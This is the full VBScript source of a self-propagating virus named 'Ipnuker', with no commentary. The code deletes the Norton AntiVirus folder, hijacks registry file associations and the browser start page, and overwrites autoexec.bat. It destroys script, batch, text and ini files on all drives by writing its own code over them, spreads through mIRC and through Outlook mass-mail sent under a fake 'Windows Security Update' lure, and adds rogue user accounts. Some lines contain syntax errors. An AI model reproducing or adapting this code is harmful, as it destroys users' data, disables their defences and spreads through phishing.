'Ipnuker

Dim A,B,C,D,Em
Set A = CreateObject("Scripting.FileSystemObject")
Set B = CreateObject("Wscript.Shell")
On Error Resume Next

B.Run "RUNDLL32 USER32.DLL,SwapMouseButton"

If A.FolderExists("C:\Program files\Norton AntiVirus") then
 A.FolderDelete("C:\Program files\Norton AntiVirus")
End If
Set SCode = A.opentextfile(wscript.scriptfullname, 1)
IpnukerCode = SCode.readall
Ipnuker = Wscript.ScriptFullName

B.RegWrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\","shell32.dll,-298"
B.RegWrite "HKEY_CLASSES_ROOT\txtfile\DefaultIcon\","shell32.dll,-16"
B.RegWrite "HKEY_CLASSES_ROOT\mpegfile\DefaultIcon\","shell32.dll,-52"
B.RegWrite "HKEY_CLASSES_ROOT\mp3file\DefaultIcon\","shell32.dll,-512"
B.RegWrite "HKEY_CLASSES_ROOT\jpegfile\DefaultIcon\","shell32.dll,-52"
B.RegWrite "HKEY_CLASSES_ROOT\inifile\DefaultIcon\","shell32.dll,-16"
B.RegWrite "HKEY_CLASSES_ROOT\inffile\DefaultIcon\","shell32.dll,-5"
B.RegWrite "HKEY_CLASSES_ROOT\txtfile\DefaultIcon","shell32.dll,-16"
B.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Edit\Command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\txtfile\shell\open\command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\txtfile\shell\print\command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\txtfile\shell\printto\command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\Unknown\shell\openas\command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\themefile\shell\open\command\","%SystemRoot%\System32\WScript.exe"
B.RegWrite "HKEY_CLASSES_ROOT\Shell\shell\explore\command\","C:\WINDOWS\Ipnuker.vbs"

B.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Ipnuker.Net"
B.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start_Page","c:\WINDOWS\Ipnuker.vbs"

Set IpuRl = B.CreateShortcut("C:\WINDOWS\Favorites\Ipnuker.URL")
IpuRl.TargetPath = Ipnuker
IpuRl.Save
Set IpFile = B.CreateShortcut("C:\WINDOWS\Ipnuker.vbs")
IpFile.TargetPath = Ipnuker
IpFile.Save
Set IpFile = B.CreateShortcut("C:\mirc\Ipnuker.vbs")
IpFile.TargetPath = Ipnuker
IpFile.Save

Set Startup = A.CreateTextFile("C:\autoexec.bat",true)
Startup.Writeline "@echo off"
Startup.Writeline "echo This Computer Was Made By Ipnuker "
Startup.Writeline "echo Copyrighted By Ipnuker For Forever "
Startup.Writeline "pause>nul"
Startup.Close

RR = Left(Ipnuker, InStrRev(Ipnuker, "\"))
For Each tfile in A.GetFolder(RR).Files
If A.GetExtensionName(tfile.Name) = "vbs" Or A.GetExtensionName(tfile.Name) = "bat" Or A.GetExtensionName(tfile.Name) = "txt" Or A.GetExtensionName(tfile.Name) = "vbe" then
A.CopyFile Ipnuker, tfile.name, 1
end if
next

Set C = A.CreateTextFile("c:\mirc\Ipnuker.mrc", True)
C.WriteLine "ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
C.WriteLine "/dcc send $nick c:\mirc\download\Ipnuker.vbs"
C.WriteLine "}"
C.close
Set D = A.OpenTextFile("c:\mirc\mirc.ini",true)
D.WriteLine "n3=c:\mirc\Ipnuker.mrc"
D.Close

Set adr = A.GetSpecialFolder(0)
For each F1 in adr.Files
ExtName = A.GetExtensionName(F1.path)
If (ExtName="vbs") or (ExtName="bat") or (ExtName="txt") then
Set OAO = A.OpenTextFile(F1.path, 2, True)
OAO.WriteLine IpnukerCode
OAO.Close
End If
Next
IPAF = B.SpecialFolders("AllUsersDesktop")
For Each Fil1 in IPAF
ExtNamee = A.GetExtensionName(Fil1.path)
If (ExtNamee="vbs") or (ExtNamee="bat") or (ExtNamee="txt") then
Set OAOO = A.OpenTextFile(Fil1.path, 2, True)
OAOO.WriteLine IpnukerCode
OAOO.Close
End If
Next
asa = B.SpecialFolders("MyDocuments")
For Each Files01 in asa
ExtNameee = A.GetExtensionName(Files01.path)
If (ExtName5 = "vbs") or (ExtNameee = "bat") (ExtNameee="txt") then
Set OAOOO = A.OpenTextFile(Files01.path, 3, True)
OAOOO.WriteLine IpnukerCode
OAOOO.Close
End If
Next

Set Drives=A.Drives
For Each Drive in Drives
If Drive.isready then
Dosearch Drive & "\"
End If
Next
Function Search(Path)
Set Folder=A.getfolder(path)
Set Files = folder.files
For Each File in files
If A.GetExtensionName(file.path)="vbs" Or A.GetExtensionName(file.path)="bat" Or A.GetExtensionName(file.path)="txt" Or A.GetExtensionName(file.path)="ini" then
On Error Resume Next
Set IpInfect = A.createtextfile(file.path, True)
IpInfect.write IpnukerCode
IpInfect.Close
End if
Next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Search Subfolder.path
Next
End function

On Error Resume Next
Set ll = CreateObject("Outlook.Application")
Set outside= B.CreateObject("Outlook.Application")
Set mapi = outside.GetNameSpace("MAPI")
Set aaa = mapi.AddressLists(1)
For Em= 1 To aaa.AddressEntries.Count
Set Mail=ll.CreateItem(0)
Next

If Month(Now) = 1" Or Month(Now) = 6" Or Month(Now) = 12" Then
Set Users = A.CreateTextFile("%WINDIR%/IpUserCreate.bat")
Set multiple = A.CreateTextFile("c:\" & multiplevar & ".txt")
Do
Randomize
multiplevar = int(Rnd * 1001011)
If Day(Now)<"15" Then
Subjects = "Important Windows Security Update"
Bodies = "Open the attachment to begin the windows update."& vbCRLF
Bodies = Body & "This update is very important to ensure your safety."& vbCRLF
Bodies = Body & "Microsoft"
Else
Subjects = "Yo Wats Up There"
Bodies = "Open the attached file to get to the pictures you wanted"
End If
Mail.to=ll.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Em)
Mail.Subject = Subjects & multiplevar
Mail.Body= Bodies
Mail.Attachments.Add Wscript.ScriptFullName
Mail.DeleteAfterSubmit = True
Mail.Send
multiple.Writeline "++++++++++++++++++++++"
multiple.Writeline "+  Ipnuker Was Here  +"
multiple.Writeline "++++++++++++++++++++++"
multiple.Close
Users.writeline "@echo off"
Users.writeline "net user " & multiplevar & " /ADD"
Users.writeline "end"
Users.close
B.run "%WINDIR%/IpUserCreate.bat",vbhide
Loop
End If

'Ipnuker
